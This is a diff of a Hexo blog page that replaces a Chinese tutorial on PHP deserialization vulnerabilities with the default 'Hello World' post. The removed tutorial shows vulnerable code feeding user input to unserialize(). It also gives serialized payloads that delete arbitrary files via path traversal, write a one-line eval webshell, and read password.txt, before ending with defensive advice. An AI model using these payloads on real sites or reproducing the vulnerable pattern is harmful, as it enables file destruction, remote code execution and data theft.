@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php反序列化, Fei&#39;s blog">
-    <meta name="description" content="一、什么是PHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代">
+    <meta name="keywords" content="Hello World, Fei&#39;s blog">
+    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +19,7 @@
 
     
 
-    <title>php反序列化 | Fei&#39;s blog</title>
+    <title>Hello World | Fei&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -287,12 +287,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php反序列化</h1>
+                    <h1 class="description center-align post-title">Hello World</h1>
                 </div>
             </div>
         </div>
@@ -302,43 +302,116 @@
 
 
 
-<main class="container content">
+<main class="post-container content">
 
     
-    <!-- 文章内容详情 -->
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">渗透</span>
-                            </a>
-                        
-                            <a href="/tags/php/">
-                                <span class="chip bg-color">php</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                网络安全
-                            </a>
-                        
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%90%8E%E7%AB%AF/" class="post-category">
-                                后端
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -347,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-05-17
+                    2022-05-01
                 </div>
                 
 
@@ -361,7 +434,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    75
                 </div>
                 
 
@@ -383,54 +456,19 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一、什么是PHP魔术方法"><a href="#一、什么是PHP魔术方法" class="headerlink" title="一、什么是PHP魔术方法"></a>一、什么是PHP魔术方法</h2><p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。</p>
-<h2 id="二、一些常见的魔术方法"><a href="#二、一些常见的魔术方法" class="headerlink" title="二、一些常见的魔术方法"></a>二、一些常见的魔术方法</h2><h3 id="construct-构造函数，当创建对象时自动调用。"><a href="#construct-构造函数，当创建对象时自动调用。" class="headerlink" title="__construct() :构造函数，当创建对象时自动调用。"></a>__construct() :构造函数，当创建对象时自动调用。</h3><p>__destruct():析构函数，在对象的所有引用都被删除时或者对象被显式销毁时调用，当对象被销毁时自动调用。<br>__wakeup():进行unserialize时会查看是否有该函数，有的话有限调用。会进行初始化对象。<br>__ toString():当一个类被当成字符串时会被调用。<br>__sleep():当一个对象被序列化时调用，可与设定序列化时保存的属性。</p>
-<h2 id="三、魔术方法的利用"><a href="#三、魔术方法的利用" class="headerlink" title="三、魔术方法的利用"></a>三、魔术方法的利用</h2><p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;对象被创建了__consrtuct()&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;执行了反序列化__wakeup()&#x27;</span>;</span><br><span class="line">  &#125;     </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;对象被当做字符串输出__toString&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;asdsadsad&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;执行了序列化__sleep&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;对象被销毁了__destruct()&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$stu</span> =  <span class="keyword">new</span> <span class="title class_">Stu</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//序列化</span></span><br><span class="line">    <span class="variable">$stu_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$stu</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$stu_ser</span>);</span><br><span class="line">    <span class="comment">//当成字符串输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$stu</span>&quot;</span>;</span><br><span class="line">   <span class="comment">//反序列化</span></span><br><span class="line">    <span class="variable">$stu_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$stu_ser</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$stu_unser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p> 测试结果：</p>
-<p><img src="https://img-blog.csdnimg.cn/1ed2658309a346148fb56ad8dc949d68.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<h2 id="四、反序列化漏洞的利用"><a href="#四、反序列化漏洞的利用" class="headerlink" title="四、反序列化漏洞的利用"></a>四、反序列化漏洞的利用</h2><p>由于反序列化时unserialize()函数会自动调用wakeup(),destruct(),函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制序列化的字符串时会去触发他们，从而达到攻击。</p>
-<h3 id="1-destruct-函数"><a href="#1-destruct-函数" class="headerlink" title="1.__destruct()函数"></a>1.__destruct()函数</h3><p>个网站内正常页面使用logfile.php文件，代码中使用unserialize()进行了反序列化，且反序列化的值是用户输入可控 。正常重构Stu对象</p>
-<p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="comment">//引用了logfile.php文件</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;./logfile.php&#x27;</span>;</span><br><span class="line">	<span class="comment">//定义一个类</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">19</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">StuData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;姓名:&#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;年龄:&#x27;</span>.<span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//实例化对象</span></span><br><span class="line">	<span class="variable">$stu</span> = <span class="keyword">new</span> <span class="title class_">Stu</span>();</span><br><span class="line">	<span class="comment">//重构用户输入的数据</span></span><br><span class="line">	<span class="variable">$newstu</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stu&#x27;</span>]);</span><br><span class="line">	<span class="comment">//O:3:&quot;Stu&quot;:2:&#123;s:4:&quot;name&quot;;s:25:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;s:3:&quot;age&quot;;i:120;&#125;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$newstu</span>) ;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>logfile.php 代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">LogFile</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="comment">//日志文件名</span></span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;error.log&#x27;</span>;</span><br><span class="line">		<span class="comment">//存储日志文件</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">LogData</span>(<span class="params"><span class="variable">$text</span></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="comment">//输出需要存储的内容</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;log some data:&#x27;</span>.<span class="variable">$text</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$text</span>,FILE_APPEND);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//删除日志文件</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="comment">//输出删除的文件</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;析构函数__destruct 删除新建文件&#x27;</span>.<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">			<span class="comment">//绝对路径删除文件</span></span><br><span class="line">			<span class="title function_ invoke__">unlink</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>正常输入参数：O:3:”Stu”:2:{s:4:”name”;s:2:”aa”;s:3:”age”;i:20;}</p>
-<p><img src="https://img-blog.csdnimg.cn/da7df5da82844dffac6214dc03257247.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p>重构logfile.php文件包含的对象进行文件删除 </p>
-<p><img src="https://img-blog.csdnimg.cn/039fc272e98842b29aff874c9193ed93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p> 正常重构：O:7:”LogFile”:1:{s:8:”filename”;s:9:”error.log”;}</p>
-<p> 发现正常删除，但如果我们修改参数，让其删除其他的文件呢？</p>
-<p><img src="https://img-blog.csdnimg.cn/57e9e1650b2d42f4a168f10a3e1b8ae5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p>异常重构：O:7:”LogFile”:1:{s:8:”filename”;s:10:”../ljh.php”;}</p>
-<p>执行该代码</p>
-<p><img src="https://img-blog.csdnimg.cn/33d4b864c161444582f2e93b7b9d229d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<h3 id="2-wakeup"><a href="#2-wakeup" class="headerlink" title="2.__wakeup()"></a>2.__wakeup()</h3><p>例如有一个代码为index.php，源码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>) ;</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$this</span>-&gt;test);</span><br><span class="line">			<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$class</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$class</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$class_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$class</span>);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为显示效果，把这个shell.php包含进来</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p> 传入参数：?test=O:7:”chybeta”:1:{s:4:”test”;s:19:”<?php phpinfo(); ?>“;}</p>
-<p><img src="https://img-blog.csdnimg.cn/0f70e3829e554c57b401ce4367adc3cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p> 查看shell.php文件</p>
-<p><img src="https://img-blog.csdnimg.cn/265fdfcbb5cb47049eb663cf36dc4f7d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_13,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p>也可以传入一句话木马：O:7:”chybeta”:1:{s:4:”test”;s:25:”<?php eval($_POST[1]); ?>“;}</p>
-<h3 id="3-toString"><a href="#3-toString" class="headerlink" title="3.toString()"></a>3.toString()</h3><p>举个例子，某用户类定义了一个__toString为了让应用程序能够将类作为一个字符串输出(echo $obj)，而且其他类也可能定义了一个类允许 __toString读取某个文件。把下面这段代码保存为fileread.php</p>
-<p>fileread.php代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	//读取文件类</span><br><span class="line">	class FileRead</span><br><span class="line">	&#123;</span><br><span class="line">		public $filename = &#x27;error.log&#x27;;</span><br><span class="line">		function __toString()</span><br><span class="line">		&#123;</span><br><span class="line">			return file_get_contents($this-&gt;filename);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 个网站内正常页面应引用fileread.php文件，代码中使用unserialize()进行了反序列化，且反序列化的值是用户输入可控 。</p>
-<p>测试代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	//引用fileread.php文件</span><br><span class="line">	include &#x27;./fileread.php&#x27;;</span><br><span class="line">	//定义用户类</span><br><span class="line">	class User</span><br><span class="line">	&#123;</span><br><span class="line">		public $name = &#x27;aa&#x27;;</span><br><span class="line">		public $age = 18;</span><br><span class="line">		function __toString()</span><br><span class="line">		&#123;</span><br><span class="line">			return &#x27;姓名:&#x27;.$this-&gt;name.&#x27;;&#x27;.&#x27;年龄:&#x27;.$this-&gt;age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	//O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;aa&quot;;s:3:&quot;age&quot;;i:18;&#125;</span><br><span class="line">	//反序列化</span><br><span class="line">	$obj = unserialize($_GET[&#x27;user&#x27;]);</span><br><span class="line">	//当成字符串输出触发toString</span><br><span class="line">	echo $obj;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 正常重构：O:4:”User”:2:{s:4:”name”;s:2:”aa”;s:3:”age”;i:18;}</p>
-<p> <img src="https://img-blog.csdnimg.cn/862d22aa486548e2b2120045cb005752.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<p>重构fileread.php文件包含的类进行读取password.txt文件内容</p>
-<p>重构：O:8:”FileRead”:1:{s:8:”filename”;s:12:”password.txt”;}</p>
-<p><img src="https://img-blog.csdnimg.cn/5c0e19fda2214ff29b82972d7784eca7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiA5Y-l6K-d5pyo6ams,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
-<h2 id="五、反序列化漏洞的防御"><a href="#五、反序列化漏洞的防御" class="headerlink" title="五、反序列化漏洞的防御"></a>五、反序列化漏洞的防御</h2><p>和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以最好的预防措施: </p>
-<p> 不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。<br>在进入反序列化函数之前,对参数进行限制过滤。</p>
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
                 
             </div>
@@ -457,7 +495,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/05/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2022/05/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                    <a href="http://example.com/2022/05/01/hello-world/">http://example.com/2022/05/01/hello-world/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -494,15 +532,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">渗透</span>
-                                </a>
-                            
-                                <a href="/tags/php/">
-                                    <span class="chip bg-color">php</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -671,7 +701,7 @@
         repo: 'xgrbhlhf.github.io',
         owner: 'xgrbhlhf',
         admin: ["xgrbhlhf"],
-        id: '2022-05-17T20-12-15',
+        id: '2022-05-01T22-28-44',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -971,30 +1001,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/05/19/ssrf%E5%8E%9F%E7%90%86/">
+                <a href="/2022/05/04/Hexo+Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/6.jpg" class="responsive-img" alt="ssrf原理">
+                        <img src="/medias/banner/2.jpg" class="responsive-img" alt="Hexo+Github博客搭建记录">
                         
-                        <span class="card-title">ssrf原理</span>
+                        <span class="card-title">Hexo+Github博客搭建记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            基于Hexo和Github已有框架下关于个人博客的搭建。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-19
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-04
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                    网络安全
